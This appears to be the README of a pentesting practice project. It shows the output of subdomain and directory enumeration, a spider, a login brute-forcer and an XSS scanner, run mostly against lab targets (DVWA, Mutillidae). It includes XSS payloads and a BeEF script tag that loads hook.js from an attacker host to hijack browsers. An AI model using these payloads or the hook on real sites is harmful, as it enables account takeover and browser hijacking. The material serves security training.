 ```bash
 pip install --upgrade pip
 pip install -r requirements.txt
 ```
~~~shell
$ pip freeze > requirements.txt
~~~

---
1. <a href="#web_crawler">Web Crawler</a>
2. <a href="#spider">Spider</a>
3. <a href="#brute_force_login_form">BruteForce LoginForm</a>
4. <a href="#vulnerability_scanner">Vulnerability Scanner</a>


---

### 1. **Web Crawler** <a name="web_crawler"></a>

1. **Subdomains**

   1. Alive progress

      ```text
      ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/1_crawler]
      └─$ python crawler_subdomains_3.py
      
      on 0: [+] Discovered subdomain ----> mail.google.com
      on 1: [+] Discovered subdomain ----> www.google.com
      on 2: [+] Discovered subdomain ----> admin.google.com
      on 3: [+] Discovered subdomain ----> account.google.com
      on 4: [+] Discovered subdomain ----> news.google.com
      on 5: [+] Discovered subdomain ----> search.google.com
      on 6: [+] Discovered subdomain ----> tools.google.com
      on 7: [+] Discovered subdomain ----> blog.google.com
      on 8: [+] Discovered subdomain ----> mobile.google.com
      on 9: [+] Discovered subdomain ----> video.google.com
      on 10: [+] Discovered subdomain ----> ads.google.com
      Processing |████████████████████████▌⚠︎              | (!) 11/18 [61%] in 10.7s (1.00/s) 
   
      File name: "subdomains_existing_test.txt"
   
      ```

   2. Argparse

      ```text
      ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/1_crawler]
      └─$ python crawler_subdomains_4.py -u google.com -f subdomain_dictionaries/subdomain.list  -o subdomains_success 
      
      on 0: [+] Discovered subdomain ----> mail.google.com
      on 1: [+] Discovered subdomain ----> www.google.com
      on 2: [+] Discovered subdomain ----> admin.google.com
      on 3: [+] Discovered subdomain ----> account.google.com
      on 4: [+] Discovered subdomain ----> news.google.com
      on 5: [+] Discovered subdomain ----> search.google.com
      on 6: [+] Discovered subdomain ----> tools.google.com
      on 7: [+] Discovered subdomain ----> blog.google.com
      on 8: [+] Discovered subdomain ----> mobile.google.com
      on 9: [+] Discovered subdomain ----> video.google.com
      on 10: [+] Discovered subdomain ----> ads.google.com
      Processing |████████████████████████▌⚠︎              | (!) 11/18 [61%] in 11.0s (1.00/s) 
     
      File name: "subdomains_success.txt"
      ```

2. **Directories**

   1. Alive progress

      ```text
      ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/1_crawler]
      └─$ python crawler_directories_1.py
      
      on 0: [+] Discovered URL ----> 10.0.2.12/mutillidae/classes
      on 1: [+] Discovered URL ----> 10.0.2.12/mutillidae/credits
      on 2: [+] Discovered URL ----> 10.0.2.12/mutillidae/documentation
      on 3: [+] Discovered URL ----> 10.0.2.12/mutillidae/favicon.ico
      on 4: [+] Discovered URL ----> 10.0.2.12/mutillidae/footer
      on 5: [+] Discovered URL ----> 10.0.2.12/mutillidae/header
      on 6: [+] Discovered URL ----> 10.0.2.12/mutillidae/home
      on 7: [+] Discovered URL ----> 10.0.2.12/mutillidae/images
      on 8: [+] Discovered URL ----> 10.0.2.12/mutillidae/inc
      on 9: [+] Discovered URL ----> 10.0.2.12/mutillidae/includes
      on 10: [+] Discovered URL ----> 10.0.2.12/mutillidae/index
      on 11: [+] Discovered URL ----> 10.0.2.12/mutillidae/index.php
      on 12: [+] Discovered URL ----> 10.0.2.12/mutillidae/installation
      on 13: [+] Discovered URL ----> 10.0.2.12/mutillidae/javascript
      on 14: [+] Discovered URL ----> 10.0.2.12/mutillidae/login
      on 15: [+] Discovered URL ----> 10.0.2.12/mutillidae/notes
      on 16: [+] Discovered URL ----> 10.0.2.12/mutillidae/page-not-found
      on 17: [+] Discovered URL ----> 10.0.2.12/mutillidae/passwords
      on 18: [+] Discovered URL ----> 10.0.2.12/mutillidae/phpinfo
      on 19: [+] Discovered URL ----> 10.0.2.12/mutillidae/phpinfo.php
      on 20: [+] Discovered URL ----> 10.0.2.12/mutillidae/phpMyAdmin
      on 21: [+] Discovered URL ----> 10.0.2.12/mutillidae/register
      on 22: [+] Discovered URL ----> 10.0.2.12/mutillidae/robots
      on 23: [+] Discovered URL ----> 10.0.2.12/mutillidae/robots.txt
      on 24: [+] Discovered URL ----> 10.0.2.12/mutillidae/styles
      Processing |▎⚠︎                                      | (!) 25/4613 [1%] in 18.3s (1.39/s) 
      
      File name: "dictionaries_existing_test.txt"
      
      ```
      
   2. Argparse

      ```text
      ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/1_crawler]
      └─$ python crawler_directories_3.py -u 10.0.2.12/mutillidae -f folder_dictionaries/directories.txt  -o dictionaries_success
      
      on 0: [+] Discovered URL ----> 10.0.2.12/mutillidae/classes
      on 1: [+] Discovered URL ----> 10.0.2.12/mutillidae/credits
      on 2: [+] Discovered URL ----> 10.0.2.12/mutillidae/documentation
      on 3: [+] Discovered URL ----> 10.0.2.12/mutillidae/favicon.ico
      on 4: [+] Discovered URL ----> 10.0.2.12/mutillidae/footer
      on 5: [+] Discovered URL ----> 10.0.2.12/mutillidae/header
      on 6: [+] Discovered URL ----> 10.0.2.12/mutillidae/home
      on 7: [+] Discovered URL ----> 10.0.2.12/mutillidae/images
      on 8: [+] Discovered URL ----> 10.0.2.12/mutillidae/inc
      on 9: [+] Discovered URL ----> 10.0.2.12/mutillidae/includes
      on 10: [+] Discovered URL ----> 10.0.2.12/mutillidae/index
      on 11: [+] Discovered URL ----> 10.0.2.12/mutillidae/index.php
      on 12: [+] Discovered URL ----> 10.0.2.12/mutillidae/installation
      on 13: [+] Discovered URL ----> 10.0.2.12/mutillidae/javascript
      on 14: [+] Discovered URL ----> 10.0.2.12/mutillidae/login
      on 15: [+] Discovered URL ----> 10.0.2.12/mutillidae/notes
      on 16: [+] Discovered URL ----> 10.0.2.12/mutillidae/page-not-found
      on 17: [+] Discovered URL ----> 10.0.2.12/mutillidae/passwords
      on 18: [+] Discovered URL ----> 10.0.2.12/mutillidae/phpinfo
      on 19: [+] Discovered URL ----> 10.0.2.12/mutillidae/phpinfo.php
      on 20: [+] Discovered URL ----> 10.0.2.12/mutillidae/phpMyAdmin
      on 21: [+] Discovered URL ----> 10.0.2.12/mutillidae/register
      on 22: [+] Discovered URL ----> 10.0.2.12/mutillidae/robots
      on 23: [+] Discovered URL ----> 10.0.2.12/mutillidae/robots.txt
      on 24: [+] Discovered URL ----> 10.0.2.12/mutillidae/styles
      Processing |▎⚠︎                                      | (!) 25/4613 [1%] in 18.5s (1.38/s) 
   
      File name: "dictionaries_success.txt"
   
      ```

---

### 2. **Spider** <a name="spider"></a>

1. Retrieve links from the target site from a single specified page using regular expressions

   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/2_spider]
   └─$ python spider_1.py
   
   http://10.0.2.12/mutillidae/favicon.ico
   http://10.0.2.12/mutillidae/styles/global-styles.css
   http://10.0.2.12/mutillidae/styles/ddsmoothmenu/ddsmoothmenu.css
   http://10.0.2.12/mutillidae/styles/ddsmoothmenu/ddsmoothmenu-v.css
   http://10.0.2.12/mutillidae/index.php?page=home.php
   http://10.0.2.12/mutillidae/index.php?page=login.php
   http://10.0.2.12/mutillidae/index.php?do=toggle-hints&page=home.php
   http://10.0.2.12/mutillidae/index.php?do=toggle-security&page=home.php
   http://10.0.2.12/mutillidae/set-up-database.php
   http://10.0.2.12/mutillidae/index.php?page=show-log.php
   http://10.0.2.12/mutillidae/index.php?page=captured-data.php
   http://10.0.2.12/mutillidae/
   http://10.0.2.12/mutillidae/index.php?page=credits.php
   http://10.0.2.12/mutillidae/index.php?page=user-info.php
   http://10.0.2.12/mutillidae/index.php?page=register.php
   http://10.0.2.12/mutillidae/index.php?page=view-someones-blog.php
   http://10.0.2.12/mutillidae/?page=add-to-your-blog.php
   http://10.0.2.12/mutillidae/index.php?page=site-footer-xss-discussion.php
   http://10.0.2.12/mutillidae/index.php?page=html5-storage.php
   http://10.0.2.12/mutillidae/index.php?page=capture-data.php
   http://10.0.2.12/mutillidae/index.php?page=dns-lookup.php
   http://10.0.2.12/mutillidae/index.php
   http://10.0.2.12/mutillidae/index.php?page=password-generator.php&username=anonymous
   http://10.0.2.12/mutillidae/index.php?page=user-poll.php
   http://10.0.2.12/mutillidae/index.php?page=set-background-color.php
   http://10.0.2.12/mutillidae/index.php?page=pen-test-tool-lookup.php
   http://10.0.2.12/mutillidae/index.php?page=text-file-viewer.php
   http://10.0.2.12/mutillidae/?page=view-someones-blog.php
   http://10.0.2.12/mutillidae/?page=show-log.php
   http://10.0.2.12/mutillidae/?page=text-file-viewer.php
   http://10.0.2.12/mutillidae/?page=user-info.php
   http://10.0.2.12/mutillidae/index.php?page=browser-info.php
   http://10.0.2.12/mutillidae/?page=login.php
   http://10.0.2.12/mutillidae/index.php?page=source-viewer.php
   http://10.0.2.12/mutillidae/index.php?page=arbitrary-file-inclusion.php
   http://10.0.2.12/mutillidae/index.php?page=add-to-your-blog.php
   http://10.0.2.12/mutillidae/index.php?page=secret-administrative-pages.php
   http://10.0.2.12/mutillidae/?page=credits.php
   http://10.0.2.12/mutillidae/?page=source-viewer.php
   http://10.0.2.12/mutillidae/index.php?page=framing.php
   http://10.0.2.12/mutillidae/framer.html
   http://10.0.2.12/mutillidae/index.php?page=change-log.htm
   http://10.0.2.12/mutillidae/index.php?page=installation.php
   http://10.0.2.12/mutillidae/documentation/mutillidae-installation-on-xampp-win7.pdf
   http://10.0.2.12/mutillidae/index.php?page=documentation/vulnerabilities.php
   http://10.0.2.12/mutillidae/index.php?page=documentation/how-to-access-Mutillidae-over-Virtual-Box-network.php
   http://10.0.2.12/mutillidae/index.php?page=usage-instructions.php
   http://10.0.2.12/mutillidae/index.php?page=php-errors.php
   http://10.0.2.12/mutillidae/index.php?page=notes.php
   ```     
   
2. Get links from target site from all pages using regular expressions

   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/2_spider]
   └─$ python spider_2.py
   ```
3. Argparse
   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/2_spider]
   └─$ python spider_4.py -u http://10.0.2.12/mutillidae/ -o spider_dictionaries_success 
   
   ```

---

### 3. **BruteForce LoginForm** <a name="brute_force_login_form"></a> 

1. No argparse

   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/3_bruteforce_login_form]
   └─$ python logit_form_bruteforce_3.py
   on 63: [+] Got the login and the password ==> admin | password
   on 99: [+] Got the login and the password ==> admin | password
   Processing |████████████████████████████████████████| 99/99 [100%] in 6.6s (15.04/s) 
   
   File name: "password_success.txt"
   
   ```
   
2. Argparse

   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/3_bruteforce_login_form]
   └─$ python logit_form_bruteforce_4.py -u http://10.0.2.12/dvwa/login.php -l password_dictionaries/login.txt -p password_dictionaries/passwords.txt
   on 63: [+] Got the login and the password ==> admin | password
   on 99: [+] Got the login and the password ==> admin | password
   Processing |████████████████████████████████████████| 99/99 [100%] in 6.7s (14.69/s) 
   
   File name: "password_success.txt"
   ```

3. Making a POST request to a specific URL with a set of data

   ```html
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/3_bruteforce_login_form]
   └─$ python logit_form_post_1.py 
   
   <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
   
   <html xmlns="http://www.w3.org/1999/xhtml">
   
           ........
   
   </html>

   ```
   
4. Sends a POST request to the post URL with the post_data as data.
   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/3_bruteforce_login_form]
   └─$ python extract_forms_2.py
   method: post
   post_url: http://10.0.2.12/dvwa/login.php
   - - - - - - - - - - - - - - - - - - - - 
   [<input class="loginInput" name="username" size="20" type="text"/>, <input autocomplete="off" class="loginInput" name="password" size="20" type="password"/>, <input name="Login" type="submit" value="Login"/>]
   - - - - - - - - - - - - - - - - - - - - 
   input_name: username
   input_type: text
   input_value: None
   * * * 
   input_name: password
   input_type: password
   input_value: None
   * * * 
   input_name: Login
   input_type: submit
   input_value: Login
   * * * 
   
   ```

   ```text
   ┌──(kali㉿kali)-[~/PycharmProjects/Pentest_Web/3_bruteforce_login_form]
   └─$ python extract_forms_3.py
   {'target_host': 'test', 'dns-lookup-php-submit-button': 'Lookup DNS'}
   [+] Success !!!
   ```
   
---

### 4. **Vulnerability Scanner** <a name="vulnerability_scanner"></a>

```text
1. Fill in the data_dict fields in accordance with the login form on the site

2. Add addresses to links_to_ignore that should be excluded

3. In the def submit_form(....) method, be sure to check all fields visually on the site before running.
Checking through the inspect method on the site

4. In the test_xss_in_link method, don't forget to visually check the prefix on the site before running it.
```
```text
XSS - Cross Site Scripting vulns

Three main types:
1. Persistent/Stored XSS
2. Reflected XSS
3. DOM based XSS
```

1. Test submit_form:
   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/4_vulnerability_scanner]
   └─$ python vulnerability_scanner_3.py
   
   It`s OK 😃
   ```
   
2. Reflected XSS
   ```text
   http://10.0.2.12/dvwa/vulnerabilities/xss_r/
   
   "<sCript>alert('XSS PAYLOAD')</scriPt>"
   ```
   
3. Stored XSS
   ```text
   http://10.0.2.12/dvwa/vulnerabilities/xss_s/
   
   Name: Test Name
   Message: "<sCript>alert('XSS PAYLOAD')</scriPt>"
   ```
   
4. Beef-xss

   1. Install BeEF / Start / Stop
      ```text
      sudo apt install beef-xss
      ```
      ```text
      sudo beef-xss
   
      sudo beef-xss-stop
      ```
      ```text
      Default login password beef:beef
      or create deff
      ```
   2. Permissions on the machine
      ```text
      Username: admin
      Security Level: low
      PHPIDS: disabled
      ```
   3. Increase the size of the input field
      ```text
      Selecting Inspect in the Browser ==> mtxMessage="500"
      ```
      ```text
      <script src="http://10.0.2.5:3000/hook.js"></script>
      ```
      
   4. Sending a test command alert
      ```text
      Online Browsers => Target Machine => Commands => Create Alert Dialog => BeEF Alert Dialog
      ```
      
5. Change security settings on metasploitable machine

   ```text
   cd /var/www/dvwa/dvwa/includes/
   
   sudo nano dvwaPage.inc.php
   
   setcookie ('security', 'medium')
   ```
   
6. Test xss in form:

   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/4_vulnerability_scanner]
   └─$ python vulnerability_scanner_5.py
   form => 
   <form action="#" method="GET" name="XSS">
   <p>What's your name?</p>
   <input name="name" type="text"/>
   <input type="submit" value="Submit"/>
   </form>
   
   - - - - - - - - - - - - - - - - - - - - 
   post_data => 
   {'name': "<sCript>alert('XSS PAYLOAD')</scriPt>", None: 'Submit'}
   
   - - - - - - - - - - - - - - - - - - - - 
   True
   ```
   
7. Test xss in link:

   ```text
   ┌──(venv_Pentest_Web)─(kali㉿kali)-[~/PycharmProjects/Pentest_Web/4_vulnerability_scanner]
   └─$ python vulnerability_scanner_6.py
   test_xss_in_link => 
   http://10.0.2.12/dvwa/vulnerabilities/xss_r/?name=<sCript>alert('XSS PAYLOAD')</scriPt>test#
   
   - - - - - - - - - - - - - - - - - - - - 
   True
   ```
8. Run scanner:
   ```pycon
   python vulnerability_scanner_9.py
   ```

